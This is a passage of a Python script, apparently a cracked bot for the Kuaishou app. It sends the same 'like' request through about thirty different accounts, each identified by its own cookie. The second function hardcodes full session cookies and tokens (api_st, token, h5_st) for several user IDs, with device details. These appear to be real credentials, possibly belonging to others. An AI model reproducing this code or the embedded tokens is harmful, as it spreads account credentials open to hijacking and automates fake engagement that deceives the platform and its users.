        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie27
    }

    headers28 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie28
    }
    headers29 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie29
    }
    headers30 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie30
    }

    yuluoyyds = '"result":1'

    response = requests.post(url, data=payload, headers=headers1)
    if yuluoyyds in response.text:
        print(green + '1' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('1', red + '点赞失败' + redd)
    response2 = requests.post(url, data=payload, headers=headers2)
    if yuluoyyds in response2.text:
        print(green + '2' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('2', red + '点赞失败' + redd)
    response3 = requests.post(url, data=payload, headers=headers3)
    if yuluoyyds in response3.text:
        print(green + '3' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('3', red + '点赞失败' + redd)
    response4 = requests.post(url, data=payload, headers=headers4)
    if yuluoyyds in response4.text:
        print(green + '4' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('4', red + '点赞失败' + redd)
    response5 = requests.post(url, data=payload, headers=headers5)
    if yuluoyyds in response5.text:
        print(green + '5' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('5', red + '点赞失败' + redd)
    response6 = requests.post(url, data=payload, headers=headers6)
    if yuluoyyds in response6.text:
        print(green + '6' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('6', red + '点赞失败' + redd)
    response7 = requests.post(url, data=payload, headers=headers7)
    if yuluoyyds in response7.text:
        print(green + '7' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('7', red + '点赞失败' + redd)
    response8 = requests.post(url, data=payload, headers=headers8)
    if yuluoyyds in response8.text:
        print(green + '8' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('8', red + '点赞失败' + redd)
    response9 = requests.post(url, data=payload, headers=headers9)
    if yuluoyyds in response9.text:
        print(green + '9' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('9', red + '点赞失败' + redd)
    response10 = requests.post(url, data=payload, headers=headers10)
    if yuluoyyds in response10.text:
        print(green + '10' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('10', red + '点赞失败' + redd)
    response11 = requests.post(url, data=payload, headers=headers11)
    if yuluoyyds in response11.text:
        print(green + '11' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('11', red + '点赞失败' + redd)
    response12 = requests.post(url, data=payload, headers=headers12)
    if yuluoyyds in response12.text:
        print(green + '12' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('12', red + '点赞失败' + redd)
    response13 = requests.post(url, data=payload, headers=headers13)
    if yuluoyyds in response13.text:
        print(green + '13' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('13', red + '点赞失败' + redd)
    response14 = requests.post(url, data=payload, headers=headers14)
    if yuluoyyds in response14.text:
        print(green + '14' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('14', red + '点赞失败' + redd)
    response15 = requests.post(url, data=payload, headers=headers15)
    if yuluoyyds in response15.text:
        print(green + '15' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('15', red + '点赞失败' + redd)
    response16 = requests.post(url, data=payload, headers=headers16)
    if yuluoyyds in response16.text:
        print(green + '16' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('16', red + '点赞失败' + redd)
    response17 = requests.post(url, data=payload, headers=headers17)
    if yuluoyyds in response17.text:
        print(green + '17' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('17', red + '点赞失败' + redd)
    response18 = requests.post(url, data=payload, headers=headers18)
    if yuluoyyds in response18.text:
        print(green + '18' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('18', red + '点赞失败' + redd)
    response19 = requests.post(url, data=payload, headers=headers19)
    if yuluoyyds in response19.text:
        print(green + '19' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('19', red + '点赞失败' + redd)
    response20 = requests.post(url, data=payload, headers=headers20)
    if yuluoyyds in response20.text:
        print(green + '20' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('20', red + '点赞失败' + redd)

    response21 = requests.post(url, data=payload, headers=headers21)
    if yuluoyyds in response21.text:
        print(green + '21' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('21', red + '点赞失败' + redd)

    response22 = requests.post(url, data=payload, headers=headers22)
    if yuluoyyds in response22.text:
        print(green + '22' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('22', red + '点赞失败' + redd)
    response23 = requests.post(url, data=payload, headers=headers23)
    if yuluoyyds in response23.text:
        print(green + '23' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('23', red + '点赞失败' + redd)
    response24 = requests.post(url, data=payload, headers=headers24)
    if yuluoyyds in response24.text:
        print(green + '24' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('24', red + '点赞失败' + redd)
    response25 = requests.post(url, data=payload, headers=headers25)
    if yuluoyyds in response25.text:
        print(green + '25' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('25', red + '点赞失败' + redd)

    response26 = requests.post(url, data=payload, headers=headers26)
    if yuluoyyds in response26.text:
        print(green + '26' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('26', red + '点赞失败' + redd)

    response27 = requests.post(url, data=payload, headers=headers27)
    if yuluoyyds in response27.text:
        print(green + '27' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('27', red + '点赞失败' + redd)
    response28 = requests.post(url, data=payload, headers=headers28)
    if yuluoyyds in response28.text:
        print(green + '28' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('28', red + '点赞失败' + redd)
    response29 = requests.post(url, data=payload, headers=headers29)
    if yuluoyyds in response29.text:
        print(green + '29' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('29', red + '点赞失败' + redd)
    response30 = requests.post(url, data=payload, headers=headers30)
    if yuluoyyds in response30.text:
        print(green + '30' + redd, "点赞成功，状态码：", response.status_code)
    else:
        print('30', red + '点赞失败' + redd)


def main_menu7():
    import sys
    import subprocess

    # 检查并安装所需的库
    required_libraries = ["requests", "json"]

    missing_libraries = []
    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            missing_libraries.append(lib)

    if missing_libraries:
        print(f"缺少库: {', '.join(missing_libraries)}")
        install = input("是否要自动安装缺少的库？(y/n): ").strip().lower()
        if install == 'y':
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', *missing_libraries])
            for lib in missing_libraries:
                __import__(lib)
        else:
            sys.exit(1)

    import requests
    import json
    red = "\033[31m"
    green = '\033[32m'
    redd = "\033[0m"
    print(
        green + '伏笔牛逼！破解认准伏笔' + redd)
    Cookie = 'kpn=KUAISHOU; kpf=ANDROID_PHONE; userId=3771448892; did=ANDROID_21354a48c81c8568; c=HONOR_YZ_2022; ver=12.1; appver=12.1.20.35334; language=zh-cn; countryCode=CN; sys=ANDROID_14; mod=HONOR%28ALI-AN00%29; net=NOTFOUND; deviceName=HONOR%28ALI-AN00%29; earphoneMode=1; isp=CMCC; ud=3771448892; did_tag=0; egid=DFPF71372E7A04AED1FD20F9A6EE102299DA988ABFD634C64A86E778E63BA11F; thermal=10030; kcv=1571; app=0; bottom_navigation=false; android_os=0; oDid=ANDROID_21354a48c81c8568; boardPlatform=parrot; newOc=HUAWEI; androidApiLevel=34; slh=0; country_code=cn; nbh=2; hotfix_ver=; did_gt=1709449665596; keyconfig_state=2; cdid_tag=7; max_memory=384; sid=f26d9579-1c8e-4556-8240-7e8724753d37; cold_launch_time_ms=1720695978777; oc=HONOR_YZ_2022; sh=2652; deviceBit=0; browseType=4; ddpi=520; socName=Qualcomm+Snapdragon+6450; is_background=0; sw=1200; ftt=; abi=arm64; cl=0; userRecoBit=3; device_abi=arm64; totalMemory=11437; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_8e961420857fbe00; sbh=130; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAFz-kp1DGMUFGl4sWVyPin8cvT9cgpgoWbGeX3JYj9JjbITtgR5tL1hUl7oYUa1ay66zJi7ZacJrB_F08CG1127JqEEe0_kNs2srEq91TOgm36ZRPeoH8a9Yhlj12OHRUbAjjaLHsV_pmcS4PcqYzFmLwNl_XZac7XJO88Uw-XRpD1Ypi2C0TNqxHpNy9PCEskO3w67PiCbBa9cux4sRkXwGhJEJSDbmRFB8aBbsn7UJvfzpQciICcOqzEIPB1l6DDbRUcoQ_wMyVgjVVvlC4itPyjIkqLXKAUwAQ; token=1e1dcaf56d0b46ad9ed5b61ff0236f0d-3771448892; __NSWJ=; client_key=3c2cd3f3; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAeaoYpzAzS9IbuNjdzjOykN64Ezr-F-VlYWvOWHyB5JFJeDfr2vJHU0nPrRhIvm4GaNbCj8VtVlb8BA6bN4rdO_l98qsq5n-th1y4tPjjGaFYDb5O9hMWkeFmcVDhukjCbS7JtsbFm8km0NGRBXWcZZ9ZJCIKr4noWTVHhVshNn-B0O9nCAeINdyDBatnh_Jmu5H5zlQbKPCu8_cah09-4IaEn0DMNGTGbtZm1-Kfj1W_J6I5SIguhHXtLNCHvMBIgt-j5kH6IbCR5h5F9aVtX3egRCX9WIoBTAB'

    Cookie2 = 'kpn=NEBULA; kpf=ANDROID_PHONE; userId=4045030515; did=ANDROID_e7a9ee227cbea6be; c=VIVO; ver=12.5; appver=12.5.40.8118; language=zh-cn; countryCode=CN; sys=ANDROID_14; mod=vivo%28V2338A%29; net=5G; deviceName=vivo%28V2338A%29; earphoneMode=1; isp=CUCC; ud=4045030515; did_tag=0; egid=DFPF286AC16D03ECD30DED5DC336B3777A7CE414129F4616A3540FF168725C56; thermal=10000; kcv=1571; app=0; bottom_navigation=true; android_os=0; oDid=ANDROID_34376f39074fc4fa; boardPlatform=kalama; newOc=VIVO; androidApiLevel=34; slh=0; country_code=cn; nbh=147; hotfix_ver=; did_gt=1705581926105; keyconfig_state=2; cdid_tag=2; max_memory=256; cold_launch_time_ms=1720681360126; oc=VIVO; sh=2800; deviceBit=0; browseType=3; ddpi=560; socName=Qualcomm+Snapdragon+8550; is_background=0; sw=1260; ftt=; apptype=22; abi=arm64; cl=0; userRecoBit=0; device_abi=arm64; icaver=1; totalMemory=15223; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_2f36c1d57d9988c4; sbh=126; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAGWo4plaTN7nR1q1QjwT-9NWLKXuqlrnRJL-eBoxsNo40O-Yu1cWiqrY2PAL1WubE19Vl4PBykLNziqnz4UdA0q1Xa9Jb8DINqGgvWRuzkAEfUGtuYoAeEohke-EoGcztI2envqu4-dmES-0R_e95DMYDv_NiQd-9BPeI_aeN1W5RrB99N1DhU0_s7LFDhJe4g5kOqSrF3FljqxFtvljbaYGhJXa5y3Gp9GOYdlC6C2E2N1_EwiIKFyP_pFgg36dF1n8q4yAVuOCMT2DxiQ-cGM0EZxkGF2KAUwAQ; token=Cg9rdWFpc2hvdS5hcGkuc3QSoAGWo4plaTN7nR1q1QjwT-9NWLKXuqlrnRJL-eBoxsNo40O-Yu1cWiqrY2PAL1WubE19Vl4PBykLNziqnz4UdA0q1Xa9Jb8DINqGgvWRuzkAEfUGtuYoAeEohke-EoGcztI2envqu4-dmES-0R_e95DMYDv_NiQd-9BPeI_aeN1W5RrB99N1DhU0_s7LFDhJe4g5kOqSrF3FljqxFtvljbaYGhJXa5y3Gp9GOYdlC6C2E2N1_EwiIKFyP_pFgg36dF1n8q4yAVuOCMT2DxiQ-cGM0EZxkGF2KAUwAQ; __NSWJ=; client_key=2ac2a76d; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgASTYw4u-T2QD4HMTo-NaMnLwSRnpV0MN-_rURKo1crvndXkterX1B6mlevoBpOxxH6ZANeHbw5vEOmCaGhwJuTv1VjefIYQDmYvZUG9uHcR0wt2Zt-jX2in9MVAWG7e1yirdhGuI2GA0nSm11OB9TRMR0sx7CHyQhQxAYs71oHbfCzUS8m1A1iGlkDy3LuVdAMMSuAH4QRciaX-uf7alr2UaEgiKSSCFO1G6_3XV9G0GJ0X9uyIg7sgUWhistenqYXnf5s-IRJ9-Jx5W6N_ieD2bgxYcMicoBTAB; sid=839718ec-393a-48f4-b15e-fdd2083c5d78'

    Cookie3 = 'kpn=KUAISHOU; kpf=ANDROID_PHONE; userId=1534140604; did=ANDROID_065d3b5144a99b13; c=VIVO_YZ_2022; ver=12.5; appver=12.5.40.37056; language=zh-cn; countryCode=CN; sys=ANDROID_14; mod=vivo%28V2301A%29; net=WIFI; deviceName=vivo%28V2301A%29; earphoneMode=1; isp=CUCC; ud=1534140604; did_tag=0; egid=DFP6A35C8433CA2E89CBBAC60990FB54F545F67890CCC39116C3869140A89780; thermal=10000; kcv=1571; app=0; bottom_navigation=false; android_os=0; oDid=ANDROID_065d3b5144a99b13; boardPlatform=taro; newOc=VIVO; androidApiLevel=34; slh=0; country_code=cn; nbh=147; hotfix_ver=; did_gt=1719728207665; cdid_tag=7; max_memory=256; oc=VIVO_YZ_2022; sh=2800; deviceBit=0; browseType=4; ddpi=560; socName=Qualcomm+Snapdragon+8475; is_background=0; sw=1260; ftt=; abi=arm64; cl=0; userRecoBit=0; device_abi=arm64; icaver=1; totalMemory=11272; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_2503c31097060df3; sbh=126; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAFCuByhnNf_OpJI8Tw8PvLkJ4NbRgNFGzAZ_dLRN-g-PSp1GPj1Ru6uHfUchQIel0D2sm6OEcRtbTWyI3dtCjImsAC8S_ALiidlH03C1QxX6uVH0fsdlJruXbaDL20WBvCXjmgxRnj4m9fSqbYsD6LHD6sPMA6SeCudMBIuiBiKiU9D6R6ZUhkSb8f0udiYe3d5y3_klmZbLCgJy9MlIicZGhJey_IdJfJMt4oIXuVy7QAVNNEiIDKJOeXUD6CsrALAItIXwTrw5ylirsAYeTaOfDKE5al0KAUwAQ; token=47b3157b0b99458abae7c86dded71168-1534140604; __NSWJ=; client_key=3c2cd3f3; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAdDT2kyRYONnPZtSK0Vk3ElnTTgkFJWEoLW7uxGobMqowI7fX2SfAUIfO-8x5LOK0gPEiRtaCjof4Y0hcY__uWg3ahKG8o85iFw_dq8RcnXLFumG933k8zgK8vcj3vz2RGWy8g-_E558G3TyOrR5iXQGwX90J2VF4J1FZ85WtLV15W7ThdNhE2u6Oy20ntC1W3ewI-uxbfHk357DKwFNMowaEqXFJenSUi3iK30l-1CPZIGgQSIgoC1TRVuzf10WwN0d-_qvAdl7wS8qjFvHceVoiEzEaVYoBTAB; keyconfig_state=1; sid=f082614f-1986-4f77-a95c-ef1d4265c811; cold_launch_time_ms=1720685184527'

    Cookie4 = 'kpn=KUAISHOU; kpf=ANDROID_PHONE; userId=2602155855; did=ANDROID_9580cc04b0d429f5; c=VIVO_KWAI; ver=12.6; appver=12.6.10.37264; language=zh-cn; countryCode=CN; sys=ANDROID_9; net=WIFI; deviceName=vivo%28V1901A%29; earphoneMode=1; isp=; ud=2602155855; did_tag=0; egid=DFP0164CE549D513EA8440796DC1370276778FC0242E0313AE4DF560A1722649; kcv=1571; app=0; bottom_navigation=false; android_os=0; oDid=ANDROID_2ab37a8cbfe72f72; boardPlatform=mt6765; newOc=VIVO; androidApiLevel=28; slh=0; country_code=cn; nbh=84; hotfix_ver=; did_gt=1720686610101; keyconfig_state=2; cdid_tag=7; max_memory=256; sid=322559bd-2be5-46b3-a431-77f11f6edc5d; cold_launch_time_ms=1720686607746; oc=VIVO_KWAI; sh=1544; deviceBit=0; browseType=4; ddpi=320; socName=MediaTek+MT6765V%2FCB; sw=720; ftt=bd-T-T; abi=arm64; cl=0; userRecoBit=0; device_abi=arm64; icaver=1; totalMemory=3727; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_a9de950e57b25d61; sbh=56; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAEM1y26Ryj49Vy5Y6n8IZD8iihU0eHHikiXbbmDdeSOQxYVBBwzOyHGV0eF_qlpt0YjZrgA7JEu66-UUGdrK_LDNDSSF8UPAZoDMxe2M_C_5Cj5ypSlxsc6xb12MrzwER-6OhwIhzxjd-wxeir5-wctD_0TGqpfSYcf9-dWvaCvJr2OVtJd1YvJR56KwoX2DvyRsBZ6EEGeuMJzTtqHvAp-GhJEJSDbmRFB8aBbsn7UJvfzpQciIBSH4y4PmD5WtAT908Cl2ZyaX5lHz24yibVAMFg0OszxKAUwAQ; token=c8c3fadd14534ac4a75c7ccf892b7057-2602155855; __NSWJ=; client_key=3c2cd3f3; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAZUm_HlLavFGcCf5i9P5Lv65JYAbXNtJkE5iyEiDHs6oBezBsADWkwYiAVqXM2XqsSczaegLWJNCaX6kziHMlDhdSwHF_T6P5UKy1otK-PsotHiJI55kENkll0Q2lvVrSu-v0Sbf1zOxOjKZQo5-opuSrx9-82V1bY0BOS1EEZGl2-3Fenct8AdKdMRJtHi_7xlVrx0RS2c3BL8VSZKZn3gaEggwqgDykTzg7MJbL1qToyt0NiIg7EA8-FGnss3H6-F65GOUNdO9Sof7UScOJnwBeCslNbUoBTAB; mod=vivo%28V1901A%29; is_background=0'

    Cookie5 = 'kpn=KUAISHOU; kpf=ANDROID_PHONE; userId=3113564803; did=ANDROID_70f29ffaf5d76aa2; c=XIAOMI_YZ_2022; ver=12.5; appver=12.5.10.36748; language=zh-cn; countryCode=CN; sys=ANDROID_13; mod=Xiaomi%2821091116C%29; net=WIFI; deviceName=Xiaomi%2821091116C%29; earphoneMode=2; isp=CUCC; ud=3113564803; did_tag=0; egid=DFP8C8F86CD3191D7CAC76B9875A0A507C14394C71C3DF9C0E3AB4FA95C7D267; thermal=10000; kcv=1571; app=0; bottom_navigation=false; android_os=0; oDid=ANDROID_70f29ffaf5d76aa2; boardPlatform=mt6877; newOc=XIAOMI; androidApiLevel=33; slh=0; country_code=cn; nbh=44; hotfix_ver=; did_gt=1719653836547; keyconfig_state=2; cdid_tag=7; lkvr=LScxdtpr_BADRtLOhHATphgoNCDLWZTtqO1g2UwYL8dNJH_g6NnZpz_nY90DVuq7mRjEBA; max_memory=256; sid=889457d4-4123-4717-9358-73c67da49d7b; cold_launch_time_ms=1720694480555; oc=XIAOMI_YZ_2022; sh=2400; deviceBit=0; browseType=4; ddpi=440; socName=MediaTek+MT6877V%2FTZA; is_background=0; sw=1080; ftt=K-T-T; abi=arm64; cl=0; userRecoBit=0; device_abi=arm64; ll_client_time=1720518363841; icaver=1; totalMemory=7489; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_2c55e2da83b4972e; sbh=80; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAERHZ2K6UJplsuF81bxPVpzYiZ4R5K-N8DFGIKfl8twiA985njJ5C--MfoELUkj-5ZdSyQrytiInt21xph-Hk2pyaqjLX4g7RFYdAooCmOV1HLiELUzGDbI6qxuTDIQo9QxQisBvQuMi-B523YV6r1vFYRqc3V4j1nHhInZeaTMNnXkrrstWrw_PP4FmXjA_F2ySCr_yLWNDiSRzxD4X59NGhKBn81trpJKB6BrmlxeXw7Wm2EiIMpS8oND3U09BXdHtZqHyHalMb0wT7K437O5MOvrbwftKAUwAQ; token=8fa4ba696e3d46228bf0c8ca65b408f8-3113564803; __NSWJ=; client_key=3c2cd3f3; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgATK_JKGadyF-LCwgrXbGgO34RDX-XR4L9wZkEjigrFC1mZqTni_yXrqKYUInYPaSg1YgyeDNB-iX8uB_fmL1-crl1GO_89SnUT-Rgg8QxBmYulf_z1nkftG5ZuUxLg2eDT0NS49H9rCtaQ8RG-HXZdYR8JnsJxtVtU1CTWT6Cu35M8HyiJeSuSenN6Qb_mRCQPjR_hLYZt2_MLWTNUtahbUaEg0_YXPVwk9IXs622rYg9Se0USIg2SJMr6_OKdCX3x3Hfsmr48_pwYcsPXUsJuGqKcYyKy8oBTAB'

    Cookie6 = 'kpn=KUAISHOU; kpf=ANDROID_PHONE; userId=1160489065; did=ANDROID_68e05680a9881003; c=XIAOMI_YZ_2023; ver=12.6; appver=12.6.10.37264; language=zh-cn; countryCode=CN; sys=ANDROID_14; mod=Xiaomi%2823090RA98C%29; net=WIFI; deviceName=Xiaomi%2823090RA98C%29; earphoneMode=1; isp=CUCC; ud=1160489065; did_tag=0; egid=DFP31CC49E14284EEF5668A6FFB9EB34E721B71B3BBE8821587F11FD551F4BEB; thermal=10030; kcv=1571; app=0; bottom_navigation=false; android_os=0; oDid=ANDROID_bbc60f218f7ff502; boardPlatform=mt6886; newOc=XIAOMI; androidApiLevel=34; slh=0; country_code=cn; nbh=48; hotfix_ver=; did_gt=1720501406603; keyconfig_state=2; cdid_tag=2; max_memory=256; sid=7d265b2e-964a-4b67-99e5-aa8960f0831e; cold_launch_time_ms=1720694924025; oc=XIAOMI_YZ_2023; sh=2712; deviceBit=0; browseType=4; ddpi=480; socName=MediaTek+MT6886; is_background=0; sw=1220; ftt=; abi=arm64; cl=0; userRecoBit=0; device_abi=arm64; icaver=1; totalMemory=15411; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_81ece9cda7a790b7; sbh=104; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAH-nOjlYbJAX_yhphR-I9DTRqBUMzo1juL6aqsMyn-evm9oxphyESZ7y7TVrikzysrbEK-yDfwwP_2hb04VJBCXxVcNFyv1jBxAeBxqd1fh4JC_iLqhhbfHidTKYnQgkdGtbw42YaGTHro6PN1442Uo83rSjbi1PRDPCA-jOycHVqufU3-22VUcPli5I1ip8cZBbYX7WAmPUTfXxLHgDChzGhJDuMiqtgZPubHrzEMdgDufEMEiIN_6Nqmb-cb13U5TqApEsTYIgnd5t6HDInlRATxvBjofKAUwAQ; token=8e7a416d555846908057ac31536dced3-1160489065; __NSWJ=; client_key=3c2cd3f3; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAU63wQN4IZDJkJoo1I028ldR0hWGUVLGaIpNBl3DNrnZVr1VylRT5gJ3xQW-fwU-qN7z0sqpasWKlc4T3fPHC_J7iYueZ9VA-FaBv_Pg7Xe-URTu8bLypA5X3BVzi3fD7mZLWKqS-Rk7UaEEppTEK4asBNoIfY5DxxuW118U_afnQOmsjv50Uq1lluyPeevBEJBAxcJO6MXdY2aiAod8ZdoaErEJA26FToVlAmaCbr6l_rMcGiIgkTUGW7MqI-mIn-JWtTioEssmiCel2PuDZD8wGsUQGPsoBTAB'

    Cookie7 = 'kpn=KUAISHOU; kpf=ANDROID_PHONE; userId=1021028027; did=ANDROID_e1e9b10665a2bcbd; c=XIAOMI_YZ_2022; ver=12.5; appver=12.5.40.37056; language=zh-cn; countryCode=CN; sys=ANDROID_14; mod=Xiaomi%2822122RK93C%29; net=WIFI; deviceName=Xiaomi%2822122RK93C%29; earphoneMode=1; isp=CMCC; ud=1021028027; did_tag=0; egid=DFPABA9AC88A7B0C686F0EC942A634197613C1059AD6AACB8920AC6C8C1FD680; thermal=10030; kcv=1571; app=0; bottom_navigation=false; android_os=0; oDid=ANDROID_e1e9b10665a2bcbd; boardPlatform=mt6895; newOc=XIAOMI; androidApiLevel=34; slh=0; country_code=cn; nbh=56; hotfix_ver=; did_gt=1706430399581; keyconfig_state=2; cdid_tag=7; lkvr=WtD15zMtgWPzi2JfQxTk2ONwpe0xkAmNS2AYePK3yD0ETANjWYPvUKyTkSa94hjw5sRsVA; max_memory=256; sid=9bf35170-e97e-45bb-a8b4-3a1bc8f26df5; cold_launch_time_ms=1720694613797; oc=XIAOMI_YZ_2022; sh=3200; deviceBit=2; browseType=4; ddpi=560; socName=MediaTek+MT6895Z%2FCZA; is_background=0; sw=1440; ftt=; abi=arm64; cl=0; userRecoBit=2; device_abi=arm64; ll_client_time=1718629439845; icaver=1; totalMemory=7487; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_63bfa3bfe1a76c79; sbh=104; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAGLbZYsSbsP40SgMc3sCJk4mTip0kiSb1r6uNqxEnDywT_w7UELqzuYo5D1dRwtRykqNbe47bg9ERfOquaVQRk5UaTfbf62Lo7qQFjrfzqI7hRrKzytTXUzYdtXB7jcdcGfHuBgTaiYfwmft6bryDWS2STYapxImS6uFqPTJuNTGnYOV0OWiJ8D4A4WtVh5C6aTR0HaB4-OOjTWzC5Rzd5RGhJyESpTOl5I_JMcRn3Byf2u1vciICSZETM229zsJLvP_7WJnAEmHVjkj3XyQJOPdEsAvlrtKAUwAQ; token=02da8f2453ec4ba980e6aa327fadd8da-1021028027; __NSWJ=; client_key=3c2cd3f3; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAXkjdSyWDI8Jn9zj9_bzjLDKxCq2gah-OIbanO8SjUtsHNPT6ho3d-yjNubUB3mra0jdNwcfEenQ13s_G0q0w8VE1Iss-1QkvIgIEtOzAjXmdoY6K5DzbxPMXVRwufZ-i5JSoP5CtvoEl0A7gxmhQQRVaduRxgjO1OyddoFgKoQQJruR90HG__qY59Vt0_JpqbxKRa4W_mS_SiaxSa4iH4AaEgduzxS3De8OcL6wm9oIlLYepiIgRJcr4I11EmuQhf05P1YRR56IVS7Y7Vv2cmnAVIq1qcEoBTAB'

    Cookie8 = 'kpn=KUAISHOU; kpf=ANDROID_PHONE; userId=3812787912; did=ANDROID_344a528d91eaaa18; c=XIAOMI_YZ_2023; ver=12.6; appver=12.6.10.37264; language=zh-cn; countryCode=CN; sys=ANDROID_14; mod=Xiaomi%2823117RK66C%29; net=WIFI; deviceName=Xiaomi%2823117RK66C%29; earphoneMode=2; isp=CTCC; ud=3812787912; did_tag=0; egid=DFP38446ADF4C6460D3041D8CCF8935E7797783872B7CDF5144F4F6EEE03D2DD; thermal=10030; kcv=1571; app=0; bottom_navigation=false; android_os=0; oDid=ANDROID_99dfaa0dc8571a52; boardPlatform=pineapple; newOc=XIAOMI; androidApiLevel=34; slh=0; country_code=cn; nbh=56; hotfix_ver=; did_gt=1703299900495; keyconfig_state=2; cdid_tag=2; max_memory=256; sid=ca7e7ad3-127d-4611-9bbd-3d845c170848; cold_launch_time_ms=1720694533138; oc=XIAOMI_YZ_2023; sh=3200; deviceBit=0; browseType=4; ddpi=560; socName=Qualcomm+Snapdragon+8650; is_background=0; sw=1440; ftt=bd-T-T; abi=arm64; cl=0; userRecoBit=0; device_abi=arm64; icaver=1; totalMemory=15208; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_c2ae0264f0e05de0; sbh=120; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAHFtaqPQflEMMh4xdizWpH0Sc8YV2xz5eONMxrroDjP3ZVTEDCIF0w4hMmCRrqfTM4W8lOAAnoBHkm6AB4aKWC6F_27ULpbh9AHozkU9HOSqsgZoYSOldCn8pEdSw3W2wlex8bOFLtbGmHyUnuwcIqAH8ah4TBLDloeoycAj29e3dD5NPISHGQegxPPPdzh2e8nz_ctZO455W7Lw7YohEwhGhJXa5y3Gp9GOYdlC6C2E2N1_EwiICs8VHrZaccczx6IdwK48xLGicO6-Hg6RKqyCXc8E2B3KAUwAQ; token=a4d7552119e848cfba267108b79b4bd8-3812787912; __NSWJ=; client_key=3c2cd3f3; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAexpLb363VXSsn3I8qnjZMK11Lvro2Xkr8iAILMTZ3_zdYmg9JUpIM6r-gqZ7JtPdvXUR-bksWBHKVrrUWcfpURZZJx0FS55IlBWquuqh8BUj3X6xrcIpA7NMQw1lxOYnnUV2TwAncBEgNHbtO32y7TValipPAs4-QbRqjtNcWyjIeOs9HogZYOzd7rj2j61czVaUNtWPKTzotTeXAhlSugaEtIXc_XUTivPxSOZo8JjD5AnfSIgelX4RAsT8UsgBvGN-WAk-b3enp6mXCohwwlxp1uJr4UoBTAB'

